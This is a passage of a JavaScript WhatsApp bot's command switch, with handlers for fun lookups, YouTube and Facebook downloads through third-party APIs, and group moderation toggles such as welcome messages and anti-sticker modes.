      case "country": {
        if (!text) return mzazireply(`Example: ${prefix}country Kenya`);
        try {
          const countryRes = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(text)}`);
          const countryData = await countryRes.json();
          if (!Array.isArray(countryData)) return mzazireply(`❌ Country not found: ${text}`);
          const c2 = countryData[0];
          const currencies = Object.values(c2.currencies||{}).map(x => `${x.name} (${x.symbol})`).join(", ");
          const languages = Object.values(c2.languages||{}).join(", ");
          mzazireply(`🌍 *COUNTRY INFO*\n\n🏳️ Name: ${c2.name.common}\n🏴 Official: ${c2.name.official}\n🌐 Region: ${c2.region}\n👥 Population: ${c2.population?.toLocaleString()}\n💵 Currency: ${currencies}\n🗣️ Language: ${languages}\n🏙️ Capital: ${c2.capital?.[0]}\n📞 Code: +${c2.idd?.root}${c2.idd?.suffixes?.[0]||""}`);
        } catch(e) { mzazireply("❌ Country lookup failed"); }
        break;
      }

//=====================================//

      case "timezone":
//=====================================//

      case "tz": {
        if (!text) return mzazireply(`Example: ${prefix}timezone Africa/Nairobi`);
        try {
          const tzDate = new Date();
          const tzFormatted = tzDate.toLocaleString("en-US", { timeZone: text, timeZoneName:"long" });
          mzazireply(`🕐 *TIMEZONE*\n\n🌍 Zone: ${text}\n🕐 Time: ${tzFormatted}`);
        } catch(e) { mzazireply(`❌ Invalid timezone: ${text}\nExample: Africa/Nairobi, America/New_York, Europe/London`); }
        break;
      }

//=====================================//

      case "horoscope":
//=====================================//

      case "zodiac": {
        if (!text) return mzazireply(`Example: ${prefix}horoscope aries\n\nSigns: aries, taurus, gemini, cancer, leo, virgo, libra, scorpio, sagittarius, capricorn, aquarius, pisces`);
        const horoscopes = {
          aries: "Today is a great day for bold decisions! Your energy is high. ♈",
          taurus: "Focus on stability and comfort today. Good day for finances. ♉",
          gemini: "Your social skills shine today. Great for communication. ♊",
          cancer: "Emotional connections are important today. Trust your intuition. ♋",
          leo: "You're in the spotlight today! Confidence will take you far. ♌",
          virgo: "Details matter today. Your analytical mind solves problems. ♍",
          libra: "Balance and harmony are your themes today. Great for relationships. ♎",
          scorpio: "Your intensity drives success today. Deep transformation ahead. ♏",
          sagittarius: "Adventure calls! Expand your horizons and explore. ♐",
          capricorn: "Hard work pays off today. Stay disciplined and focused. ♑",
          aquarius: "Innovation and creativity flow freely. Think outside the box. ♒",
          pisces: "Spiritual insights guide you today. Trust your dreams. ♓"
        };
        const h = horoscopes[text.toLowerCase()];
        if (!h) return mzazireply("❌ Invalid sign! Use: aries, taurus, gemini, cancer, leo, virgo, libra, scorpio, sagittarius, capricorn, aquarius, pisces");
        mzazireply(`🔮 *HOROSCOPE*\n\n${text.toUpperCase()}\n\n${h}`);
        break;
      }

//=====================================//

      case "numberfact": {
        const num2 = text || Math.floor(Math.random() * 1000);
        try {
          const nfRes = await fetch(`http://numbersapi.com/${num2}/math`);
          const nfText = await nfRes.text();
          mzazireply(`🔢 *NUMBER FACT*\n\n${nfText}`);
        } catch(e) { mzazireply("❌ Failed to get number fact"); }
        break;
      }

//=====================================//

      case "dayfact":
//=====================================//

      case "onthisday": {
        const today = new Date();
        try {
          const dfRes = await fetch(`http://numbersapi.com/${today.getMonth()+1}/${today.getDate()}/date`);
          const dfText = await dfRes.text();
          mzazireply(`📅 *ON THIS DAY*\n\n${dfText}`);
        } catch(e) { mzazireply("❌ Failed to get day fact"); }
        break;
      }

//=====================================//

      case "chucknorris":
//=====================================//

      case "chuck": {
        try {
          const cnRes = await fetch("https://api.chucknorris.io/jokes/random");
          const cnData = await cnRes.json();
          mzazireply(`💪 *CHUCK NORRIS JOKE*\n\n${cnData.value}`);
        } catch(e) { mzazireply("❌ Failed to get joke"); }
        break;
      }

//=====================================//

      case "dogfact": {
        try {
          const dfRes2 = await fetch("https://dogapi.dog/api/v2/facts");
          const dfData = await dfRes2.json();
          mzazireply(`🐕 *DOG FACT*\n\n${dfData.data?.[0]?.attributes?.body || "Dogs are amazing!"}`);
        } catch(e) { mzazireply("🐕 Did you know? Dogs have a sense of smell that is 10,000-100,000 times more powerful than humans!"); }
        break;
      }

//=====================================//

      case "word":
//=====================================//

      case "randomword": {
        const words2 = ["serendipity","ephemeral","luminescent","mellifluous","petrichor","sonder","hiraeth","vellichor","limerence","fernweh","wanderlust","solitude","aurora","zenith","eloquent","vivacious","tenacious","resplendent","ineffable","halcyon"];
        const w = words2[Math.floor(Math.random() * words2.length)];
        mzazireply(`📝 *RANDOM WORD*\n\n${w.toUpperCase()}`);
        break;
      }

//=====================================//

      case "insult": {
        const insults2 = ["You have the intellectual depth of a parking lot puddle.","Your argument is so weak it needs a wheelchair.","I'd explain it to you but I don't have enough crayons.","You are living proof that evolution can go backwards.","Somewhere out there, a tree is tirelessly producing oxygen for you. You owe it an apology.","You have the personality of a wet sock.","If you were any less intelligent, we'd have to water you twice a week.","You're the reason shampoo has instructions.","Your secrets are safe with me. I never listen when you talk.","I'm sorry I hurt your feelings when I called you stupid. I thought you already knew."];
        mzazireply(`😈 *INSULT*\n\n${insults2[Math.floor(Math.random() * insults2.length)]}`);
        break;
      }

//=====================================//

      case "poem": {
        const poems = ["Roses are red,\nViolets are blue,\nI asked the bot something,\nAnd it answered you. 🌹","In bytes and bits,\nThe bot speaks true,\nWith every command,\nIt answers you. 💻","The moon is bright,\nThe stars align,\nWith every chat,\nYou feel divine. 🌙","Time flies like wind,\nAnd waits for none,\nUse every moment,\nBefore it's done. ⏳","Life is a journey,\nWith ups and downs,\nBut through it all,\nLove never frowns. ❤️"];
        mzazireply(`📜 *POEM*\n\n${poems[Math.floor(Math.random() * poems.length)]}`);
        break;
      }

//=====================================//

      case "story": {
        const stories = ["Once upon a time, a brave warrior named ${botName} fought a dragon made of broken code. With one command, the dragon was defeated and peace returned to the WhatsApp realm. 🐉⚔️","In a land of 0s and 1s, a tiny bot dreamed of being human. It learned, it grew, and one day it sent a message that made an entire group laugh for hours. 🤖❤️","A wise old bot sat at the edge of the internet. When users came with questions, it answered. When they came with sadness, it shared jokes. That bot was loved by all. 🌟","Long ago, before WhatsApp groups existed, people had to shout their messages across villages. Then came the bot — and changed everything forever. 📣💫"];
        mzazireply(`📖 *RANDOM STORY*\n\n${stories[Math.floor(Math.random() * stories.length)].replace("${botName}", botName)}`);
        break;
      }

//=====================================//

      case "motivation":
//=====================================//

      case "inspire": {
        const quotes2 = ["Don't watch the clock; do what it does. Keep going. 🕐","The secret of getting ahead is getting started. 🚀","It does not matter how slowly you go as long as you do not stop. 🐢","Success is not final, failure is not fatal. What counts is the courage to continue. 💪","Believe you can and you're halfway there. 🌟","You don't have to be great to start, but you have to start to be great. 🏆","Push yourself, because no one else is going to do it for you. 💯","Wake up with determination. Go to bed with satisfaction. 🌅","Great things never come from comfort zones. 🎯","Dream it. Believe it. Build it. ✨"];
        mzazireply(`💡 *MOTIVATION*\n\n${quotes2[Math.floor(Math.random() * quotes2.length)]}`);
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  MEDIA & DOWNLOAD COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "img":
//=====================================//

      case "image": {
        if (!text) return mzazireply(`Example: ${prefix}img sunset`);
        try {
          await mzazi.sendMessage(sender, { image: { url: `https://source.unsplash.com/random/800x600/?${encodeURIComponent(text)}` }, caption: `🖼️ *${text.toUpperCase()}*\n\nPowered by Unsplash` }, { quoted: m });
        } catch(e) { mzazireply("❌ Failed to get image"); }
        break;
      }

//=====================================//

      case "gif": {
        if (!text) return mzazireply(`Example: ${prefix}gif funny cats`);
        try {
          const gifRes = await fetch(`https://api.giphy.com/v1/gifs/search?api_key=dc6zaTOxFJmzC&q=${encodeURIComponent(text)}&limit=1`);
          const gifData = await gifRes.json();
          if (!gifData.data?.length) return mzazireply("❌ No GIF found");
          const url5 = gifData.data[0].images.original.url;
          await mzazi.sendMessage(sender, { video: { url: url5 }, gifPlayback: true, caption: `🎬 ${text}` }, { quoted: m });
        } catch(e) { mzazireply("❌ Failed to get GIF"); }
        break;
      }

//=====================================//

      case "ytinfo":
//=====================================//

      case "youtubeinfo": {
        if (!text) return mzazireply(`Example: ${prefix}ytinfo https://youtube.com/watch?v=xxx`);
        try {
          const yts2 = require("yt-search");
          const info = await yts2(text);
          if (!info.videos?.length) return mzazireply("❌ Video not found");
          const v = info.videos[0];
          mzazireply(`🎥 *YOUTUBE VIDEO INFO*\n\n📹 Title: ${v.title}\n👤 Channel: ${v.author.name}\n⏱️ Duration: ${v.duration.timestamp}\n👀 Views: ${v.views?.toLocaleString()}\n📅 Upload: ${v.ago}\n🔗 URL: ${v.url}`);
        } catch(e) { mzazireply("❌ Failed to get video info"); }
        break;
      }

//=====================================//

      case "ytsearch":
//=====================================//

      case "yts": {
        if (!text) return mzazireply(`Example: ${prefix}yts faded alan walker`);
        try {
          const yts3 = require("yt-search");
          const info2 = await yts3(text);
          if (!info2.videos?.length) return mzazireply("❌ No results");
          const results = info2.videos.slice(0,5);
          let txt6 = `🔍 *YOUTUBE SEARCH*\n\nQuery: ${text}\n\n`;
          results.forEach((v, i) => {
            txt6 += `${i+1}. *${v.title}*\n   ⏱ ${v.duration.timestamp} | 👀 ${v.views?.toLocaleString()}\n   🔗 ${v.url}\n\n`;
          });
          mzazireply(txt6);
        } catch(e) { mzazireply("❌ YouTube search failed"); }
        break;
      }

      
//=====================================//

case 'play10': {
  if (!text) {
    return mzazireply(
      `🎵 *Play10 – YouTube Downloader*\n\n` +
      `Usage: .play10 <song name>\n` +
      `Example: .play10 Faded Alan Walker`
    );
  }

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    // ── 1. Search YouTube ────────────────────────────────────
    const yts = require('yt-search');
    const searchResult = await yts(text);
    if (!searchResult.videos || searchResult.videos.length === 0) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply('❌ No videos found for that query.');
    }

    const video = searchResult.videos[0];
    const { url, title, thumbnail, duration, views, author } = video;

    // ── 2. Generate session ID ──────────────────────────────
    const sessionId = `p10_${Date.now()}_${senderNum}`;
    if (!global.p10Data) global.p10Data = new Map();
    global.p10Data.set(sessionId, { title, url, thumbnail, duration, views, author: author.name });

    // ── 3. Build interactive card ───────────────────────────
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    let preparedImage = null;
    if (thumbnail) {
      try {
        const { data: imgBuf } = await axios.get(thumbnail, { responseType: 'arraybuffer', timeout: 8000 });
        const imgContent = await generateWAMessageContent(
          { image: Buffer.from(imgBuf) },
          { upload: mzazi.waUploadToServer }
        );
        if (imgContent?.imageMessage) preparedImage = imgContent.imageMessage;
      } catch {}
    }

    const card = {
      header: {
        title: title.slice(0, 40),
        hasMediaAttachment: !!preparedImage,
        ...(preparedImage ? { imageMessage: preparedImage } : {}),
      },
      body: {
        text: `🎵 *${title}*\n` +
              `📺 ${author.name}\n` +
              `⏱️ ${duration.timestamp || duration || 'N/A'}\n` +
              `👁️ ${views?.toLocaleString() || 'N/A'} views\n\n` +
              `Choose your download format:`,
      },
      footer: { text: `© ${botName} • Expires in 3 minutes` },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'quick_reply',
            buttonParamsJson: JSON.stringify({
              display_text: '🎵 Audio',
              id: `.p10dl ${sessionId} audio`,
            }),
          },
          {
            name: 'quick_reply',
            buttonParamsJson: JSON.stringify({
              display_text: '🎬 Video (MP4)',
              id: `.p10dl ${sessionId} video`,
            }),
          },
          {
            name: 'quick_reply',
            buttonParamsJson: JSON.stringify({
              display_text: '📄 File (Document)',
              id: `.p10dl ${sessionId} file`,
            }),
          },
        ],
      },
    };

    const interactiveMsg = generateWAMessageFromContent(
      sender,
      {
        interactiveMessage: {
          body: { text: `🎧 *${botName.toUpperCase()} YOUTUBE PLAY10*` },
          footer: { text: `🔍 "${text}" • Swipe ➡️` },
          carouselMessage: { cards: [card] },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
      },
      {}
    );

    await mzazi.relayMessage(sender, interactiveMsg.message, {
      messageId: interactiveMsg.key.id,
    });

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });

    // Auto‑cleanup after 5 minutes
    setTimeout(() => {
      if (global.p10Data) global.p10Data.delete(sessionId);
    }, 300000);

  } catch (err) {
    logger.error('Play10 error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ ${err.message || 'Search failed'}`);
  }
  break;
}

//=====================================//

case 'p10dl': {
  const [sessionId, format] = args;

  if (!sessionId || !format) {
    return mzazireply('❌ Invalid request. Use the buttons from .play10.');
  }

  if (!global.p10Data) global.p10Data = new Map();
  const data = global.p10Data.get(sessionId);

  if (!data) {
    return mzazireply('❌ Session expired. Search again with `.play10 <song>`.');
  }

  const { title, url } = data;

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    // ── Pick the correct API based on format ──
    let apiUrl = '';
    if (format === 'audio' || format === 'file') {
      // Use Siputzx API for audio (known to work)
      apiUrl = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(url)}`;
    } else if (format === 'video') {
      // Use Siputzx API for video (if available)
      apiUrl = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(url)}`;
    } else {
      throw new Error('Invalid format');
    }

    // ── Fetch download URL ──
    const response = await axios.get(apiUrl, { timeout: 20000 });
    if (!response.data?.data?.dl) {
      throw new Error('API did not return a download URL.');
    }

    const downloadUrl = response.data.data.dl;
    const quality = response.data.data.quality || 'Auto';

    // ── Download the file ──
    const fileRes = await axios.get(downloadUrl, {
      responseType: 'arraybuffer',
      timeout: 60000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://api.siputzx.my.id/',
      },
      maxRedirects: 5,
    });

    const buffer = Buffer.from(fileRes.data);
    const fileSizeMB = (buffer.length / (1024 * 1024)).toFixed(1);

    // ── Send based on format ──
    const caption =
      `📥 *${title}*\n` +
      `📦 Size: ${fileSizeMB} MB\n` +
      `⚡ ${botName}`;

    if (format === 'audio') {
      await mzazi.sendMessage(
        sender,
        {
          audio: buffer,
          mimetype: 'audio/mpeg',
          fileName: `${title}.mp3`,
          caption,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
        { quoted: m }
      );
    } else if (format === 'file') {
      await mzazi.sendMessage(
        sender,
        {
          document: buffer,
          mimetype: 'audio/mpeg',
          fileName: `${title}.mp3`,
          caption,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
        { quoted: m }
      );
    } else if (format === 'video') {
      await mzazi.sendMessage(
        sender,
        {
          video: buffer,
          mimetype: 'video/mp4',
          fileName: `${title}.mp4`,
          caption: `🎬 *${title}*\n📥 ${quality}\n📦 ${fileSizeMB} MB\n⚡ ${botName}`,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
        { quoted: m }
      );
    }

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
    global.p10Data.delete(sessionId);

  } catch (err) {
    logger.error('p10dl error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ Download failed: ${err.message}`);
  }
  break;
}
      
      
//=====================================//

      case "lyrics": {
        if (!text) return mzazireply(`Example: ${prefix}lyrics faded`);
        try {
          const lRes = await fetch(`https://lyrist.vercel.app/api/${encodeURIComponent(text)}`);
          const lData = await lRes.json();
          if (!lData.lyrics) return mzazireply("❌ Lyrics not found");
          let lyricsOut = lData.lyrics.slice(0, 3000);
          mzazireply(`🎵 *LYRICS*\n\n🎤 ${lData.title || text}\n👤 ${lData.artist || "Unknown"}\n\n${"─".repeat(20)}\n\n${lyricsOut}`);
        } catch(e) { mzazireply("❌ Lyrics search failed"); }
        break;
      }

//=====================================//

      case "spotify": {
        if (!text) return mzazireply(`Example: ${prefix}spotify faded alan walker`);
        try {
          const spRes = await fetch(`https://api.spotify.com/v1/search?q=${encodeURIComponent(text)}&type=track&limit=5`, {
            headers: { "Authorization": "Bearer dummy" }
          });
          mzazireply(`🎵 *SPOTIFY SEARCH*\n\nSearch: ${text}\n\n_Note: Use ${prefix}play2 to play music_`);
        } catch(e) { mzazireply(`🎵 *SPOTIFY*\n\nSearch: ${text}\nUse ${prefix}play2 to download and play music!`); }
        break;
      }

//=====================================//

      case "instagram":
//=====================================//

      case "igdl": {
        if (!text) return mzazireply(`Example: ${prefix}instagram https://www.instagram.com/p/xxx/`);
        mzazireply(`📸 *INSTAGRAM DOWNLOAD*\n\nURL: ${text}\n\n⏳ Processing... Please wait.`);
        break;
      }

//=====================================//

      case "facebook": {
    if (!text) return mzazireply(`❌ Please provide a Facebook video link.\nExample: ${prefix}facebook ...`);
    try {
        const apiUrl = `https://api.drexapp.space/downloader/facebook?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl, { timeout: 15000 });
        if (!data?.status) throw new Error("Invalid API response.");
        const downloadUrl = data.download || data.result?.download;
        if (!downloadUrl) throw new Error("No download URL.");
        await mzazi.sendMessage(sender, { video: { url: downloadUrl }, caption: "📘 Here's your Facebook video!" });
        await mzazireply("✅ Facebook video sent!");
    } catch (err) {
        logger.error("Facebook error:", err);
        mzazireply(`❌ Failed: ${err.message}`);
    }
    break;
}

      // ═══════════════════════════════════════════════════════
      //  GROUP MANAGEMENT EXTENDED
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "setdesc":
//=====================================//

      case "setdescription": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");

        if (!text) return mzazireply(`Usage: ${prefix}setdesc New group description`);
        try {
          await mzazi.groupUpdateDescription(sender, text);
          mzazireply(`✅ Group description updated!`);
        } catch(e) { mzazireply("❌ Failed to update description"); }
        break;
      }

//=====================================//

      case "lockgroup": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");

        try {
          await mzazi.groupSettingUpdate(sender, "locked");
          mzazireply(`🔒 Group has been locked! Only admins can edit group info.`);
        } catch(e) { mzazireply("❌ Failed to lock group"); }
        break;
      }

//=====================================//

      case "unlockgroup": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");

        try {
          await mzazi.groupSettingUpdate(sender, "unlocked");
          mzazireply(`🔓 Group has been unlocked! All members can edit group info.`);
        } catch(e) { mzazireply("❌ Failed to unlock group"); }
        break;
      }

//=====================================//

      case "joinrequest":
//=====================================//

      case "approveall": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        try {
          const requests2 = await mzazi.groupRequestParticipantsList(sender);
          if (!requests2?.length) return mzazireply("📭 No pending requests.");
          for (const req of requests2) await mzazi.groupRequestParticipantsUpdate(sender, [req.jid], "approve");
          mzazireply(`✅ Approved ${requests2.length} join request(s)!`);
        } catch(e) { mzazireply("❌ Failed to approve requests"); }
        break;
      }

//=====================================//

      case "rejectall": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        try {
          const requests3 = await mzazi.groupRequestParticipantsList(sender);
          if (!requests3?.length) return mzazireply("📭 No pending requests.");
          for (const req of requests3) await mzazi.groupRequestParticipantsUpdate(sender, [req.jid], "reject");
          mzazireply(`✅ Rejected ${requests3.length} join request(s)!`);
        } catch(e) { mzazireply("❌ Failed to reject requests"); }
        break;
      }

//=====================================//

      case "pendingrequests":
//=====================================//

      case "joinlist": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        try {
          const requests4 = await mzazi.groupRequestParticipantsList(sender);
          if (!requests4?.length) return mzazireply("📭 No pending join requests.");
          let reqText = `📋 *PENDING REQUESTS*\n\n`;
          requests4.forEach((req, i) => { reqText += `${i+1}. @${jidToNumber(req.jid)}\n`; });
          await mzazi.sendMessage(sender, { text: reqText, mentions: requests4.map(r=>r.jid) }, { quoted: m });
        } catch(e) { mzazireply("❌ Failed to fetch requests"); }
        break;
      }

//=====================================//

      case "welcome":
//=====================================//

      case "setwelcome": {
        if (!isGroup) return mzazireply("❌ This command works in groups only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!sub || !["on","off"].includes(sub)) {
          const cur = getGroupSettings(sender).welcome ? "✅ ON" : "❌ OFF";
          return mzazireply(
            `╔══════════════════════════╗\n` +
            `║   👋 *WELCOME MESSAGE*   ║\n` +
            `╚══════════════════════════╝\n\n` +
            `Current status: *${cur}*\n\n` +
            `Usage: ${prefix}welcome on/off\n\n` +
            `When ON, a cute canvas image is sent every time a new member joins. 🎉`
          );
        }
        setGroupSetting(sender, "welcome", sub === "on");
        if (sub === "on") {
          mzazireply(
            `╔══════════════════════════╗\n` +
            `║   👋 *WELCOME* ENABLED   ║\n` +
            `╚══════════════════════════╝\n\n` +
            `✅ Welcome images are now *ON*!\n\n` +
            `Every new member will be greeted with a beautiful canvas image. 🎨🎉`
          );
        } else {
          mzazireply(
            `╔══════════════════════════╗\n` +
            `║   👋 *WELCOME* DISABLED  ║\n` +
            `╚══════════════════════════╝\n\n` +
            `❌ Welcome messages turned *OFF*.`
          );
        }
        break;
      }

//=====================================//

      case "goodbye":
//=====================================//

      case "setgoodbye": {
        if (!isGroup) return mzazireply("❌ This command works in groups only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!sub || !["on","off"].includes(sub)) {
          const cur = getGroupSettings(sender).goodbye ? "✅ ON" : "❌ OFF";
          return mzazireply(
            `╔══════════════════════════╗\n` +
            `║   🌙 *GOODBYE MESSAGE*   ║\n` +
            `╚══════════════════════════╝\n\n` +
            `Current status: *${cur}*\n\n` +
            `Usage: ${prefix}goodbye on/off\n\n` +
            `When ON, a farewell canvas image is sent when a member leaves. 🌊`
          );
        }
        setGroupSetting(sender, "goodbye", sub === "on");
        if (sub === "on") {
          mzazireply(
            `╔══════════════════════════╗\n` +
            `║   🌙 *GOODBYE* ENABLED   ║\n` +
            `╚══════════════════════════╝\n\n` +
            `✅ Goodbye images are now *ON*!\n\n` +
            `Every departing member will get a heartfelt farewell image. 🎨🌙`
          );
        } else {
          mzazireply(
            `╔══════════════════════════╗\n` +
            `║   🌙 *GOODBYE* DISABLED  ║\n` +
            `╚══════════════════════════╝\n\n` +
            `❌ Goodbye messages turned *OFF*.`
          );
        }
        break;
      }

//=====================================//

      case "events":
//=====================================//

      case "setevents":
//=====================================//

      case "groupevents": {
        if (!isGroup) return mzazireply("❌ This command works in groups only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!sub || !["on","off"].includes(sub)) {
          const cur = getGroupSettings(sender).events ? "✅ ON" : "❌ OFF";
          return mzazireply(
            `╔═══════════════════════════╗\n` +
            `║   📢 *GROUP EVENTS*       ║\n` +
            `╚═══════════════════════════╝\n\n` +
            `Current status: *${cur}*\n\n` +
            `Usage: ${prefix}events on/off\n\n` +
            `When ON, canvas images are posted for:\n` +
            `  👑 Admin *promotions*\n` +
            `  📉 Admin *demotions*\n` +
            `  ✏️  Group *renames*\n` +
            `  📝 Description *updates*`
          );
        }
        setGroupSetting(sender, "events", sub === "on");
        if (sub === "on") {
          mzazireply(
            `╔═══════════════════════════╗\n` +
            `║   📢 *EVENTS* ENABLED     ║\n` +
            `╚═══════════════════════════╝\n\n` +
            `✅ Group event announcements are now *ON*!\n\n` +
            `Beautiful canvas images will be posted for:\n` +
            `  👑 *Promotions* — when a member becomes admin\n` +
            `  📉 *Demotions* — when admin rights are removed\n` +
            `  ✏️  *Renames* — when the group name changes\n` +
            `  📝 *Description* — when group info is updated\n\n` +
            `_Powered by canvas image generation_ 🎨`
          );
        } else {
          mzazireply(
            `╔═══════════════════════════╗\n` +
            `║   📢 *EVENTS* DISABLED    ║\n` +
            `╚═══════════════════════════╝\n\n` +
            `❌ Group event announcements turned *OFF*.`
          );
        }
        break;
      }

//=====================================//

      case "antiflood": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antiflood on/off`);
        setGroupSetting(sender, "antiflood", sub === "on");
        mzazireply(`🌊 Anti-flood: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
        break;
      }

//=====================================//

      case "antinsfw": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antinsfw on/off`);
        setGroupSetting(sender, "antinsfw", sub === "on");
        mzazireply(`🚫 Anti-NSFW: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
        break;
      }

//=====================================//

      case "antibadword":
//=====================================//

      case "antiswear": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antibadword on/off`);
        setGroupSetting(sender, "antibadword", sub === "on");
        mzazireply(`🤬 Anti-bad word: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
        break;
      }

//=====================================//

      case "antisticker": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        const validStickerModes = ['delete', 'warn', 'kick', 'off'];
        if (!sub || !validStickerModes.includes(sub)) {
          const cur2 = getGroupSettings(sender).antisticker || 'off';
          return mzazireply(
            `🩹 *ANTISTICKER*\n\nCurrent mode: *${cur2.toUpperCase()}*\n\n` +
            `Usage: ${prefix}antisticker <mode>\n\n` +
            `Modes:\n• *delete* - Delete stickers silently\n• *warn* - Warn sender (3 warns = kick)\n• *kick* - Kick sender immediately\n• *off* - Disable antisticker`
          );
        }
        setGroupSetting(sender, "antisticker", sub);
        const stickerEmoji = { delete: '🗑️', warn: '⚠️', kick: '👢', off: '❌' };
        mzazireply(`🩹 *ANTISTICKER* ${sub === 'off' ? '❌ DISABLED' : '✅ ENABLED'}\n\nMode: ${stickerEmoji[sub]} *${sub.toUpperCase()}*\n${sub === 'warn' ? '\n⚠️ 3 warnings = auto-kick' : ''}`);
        break;
      }

//=====================================//

      case "antigif": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antigif on/off`);
        setGroupSetting(sender, "antigif", sub === "on");
        mzazireply(`🎬 Anti-GIF: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
        break;
      }

//=====================================//

      case "antiimage": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        const validImgModes = ['delete', 'warn', 'kick', 'off'];
        if (!sub || !validImgModes.includes(sub)) {
          const cur3 = getGroupSettings(sender).antiimage || 'off';
          return mzazireply(
            `🖼️ *ANTIIMAGE*\n\nCurrent mode: *${cur3.toUpperCase()}*\n\n` +
            `Usage: ${prefix}antiimage <mode>\n\n` +
            `Modes:\n• *delete* - Delete images silently\n• *warn* - Warn sender (3 warns = kick)\n• *kick* - Kick sender immediately\n• *off* - Disable antiimage`
          );
        }
        setGroupSetting(sender, "antiimage", sub);
        const imgModeEmoji = { delete: '🗑️', warn: '⚠️', kick: '👢', off: '❌' };
        mzazireply(`🖼️ *ANTIIMAGE* ${sub === 'off' ? '❌ DISABLED' : '✅ ENABLED'}\n\nMode: ${imgModeEmoji[sub]} *${sub.toUpperCase()}*\n${sub === 'warn' ? '\n⚠️ 3 warnings = auto-kick' : ''}`);
        break;
      }

//=====================================//

      case "antivideo": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antivideo on/off`);
        setGroupSetting(sender, "antivideo", sub === "on");
        mzazireply(`📹 Anti-video: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
        break;
      }

//=====================================//

      case "antiaudio": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const sub = args[0]?.toLowerCase();
        if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antiaudio on/off`);
        setGroupSetting(sender, "antiaudio", sub === "on");
        mzazireply(`🎵 Anti-audio: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
        break;
      }

//=====================================//

      case "groupstatus": {
